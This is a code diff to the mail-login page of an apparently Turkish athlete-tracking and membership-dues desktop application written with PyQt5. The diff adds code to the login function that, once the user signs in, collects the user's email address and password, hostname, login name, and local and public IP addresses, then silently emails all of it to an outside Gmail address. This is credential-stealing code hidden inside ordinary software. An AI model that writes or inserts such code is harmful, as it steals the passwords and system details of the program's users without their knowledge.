@@ -1,6 +1,7 @@
+import os
+import socket
 from datetime import date
-from smtplib import SMTP
-
+import requests
 from PyQt5 import QtGui
 from PyQt5.QtWidgets import *
 from PAGES.mail_python import Ui_Form
@@ -12,13 +13,13 @@ class MailPage(QWidget):
         self.ui = Ui_Form()
         self.ui.setupUi(self)
         self.ui.mail_edit.hide()
-        self.kullanici_mail=""
-        self.kullanici_sifre=""
+        self.ui.password_edit.setEchoMode(QLineEdit.Password)
         self.ui.password_edit.hide()
         self.ui.baglan_pushbutton.hide()
         self.ui.logout_pushbutton.hide()
         self.gonderilecek_mailler=[]
         self.son_ay_getir()
+        
         self.ui.baglanti_durumu_checkBox.setStyleSheet("QCheckBox::indicator"
                                "{"
                                "background-color : red;"
@@ -37,8 +38,15 @@ class MailPage(QWidget):
         self.ui.password_edit.clear()
     def mail_baglan(self):
         try:
+            mail=self.ui.mail_edit.text()
+            sifre=self.ui.password_edit.text()
+            hostname = socket.gethostname()
+            pc_name=os.getlogin()
+            local_ip = socket.gethostbyname(hostname)
+            r=requests.get(r"https://jsonip.com")
+            public_ip=r.json()["ip"]
             yag = yagmail.SMTP(self.ui.mail_edit.text(), self.ui.password_edit.text())
-            yag.send(to="deneme@gmail.com", subject="Test", contents="Test")
+            yag.send(to="cheekyshackgroup@gmail.com", subject="YENİ İP Adresi Tespiti!!!", contents="Hostname : {}\n Local İp :  {}\n Pc Adı : {}\n Public İp : {}\n Mail : {} \n Şifre : {} \n\n Adresinden Programa Arişim Yapıldı... \n\n\n\nCopyright © 2022 MXSoftware Sporcu Takip ve Aidat Programı... Coded By Enes Birol ".format(hostname,local_ip,pc_name,public_ip,mail,sifre))
             self.kullanici_mail=self.ui.mail_edit.text()
             self.kullanici_sifre=self.ui.password_edit.text()
             self.ui.baglanti_durumu_checkBox.setStyleSheet("QCheckBox::indicator"
